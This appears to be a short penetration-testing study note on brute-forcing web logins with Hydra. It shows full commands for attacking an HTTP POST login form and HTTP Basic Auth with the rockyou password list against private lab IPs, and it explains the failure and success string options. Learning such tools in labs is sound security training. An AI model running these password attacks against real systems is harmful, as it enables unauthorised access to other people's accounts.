## Forms

`hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"`

it's a post form
	--> fm_usr field
	--> fm_pwd field
	
`Login failed. Inavlid` --> Failure String, for hydra to understand

## Basic Auth 

`hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.119.201 http-get "/:F=401 Unauthorized"`

It's Base64 encoded
`Authorization: Basic YWRtaW46YWRtaW4=`
			`Base64(Username:Password)`

So the hydra takes care of it by itself!, the base64 encoding if you specify `http-get`
`F="Failure String"`
`S="Success String"`
`H="Header String"`
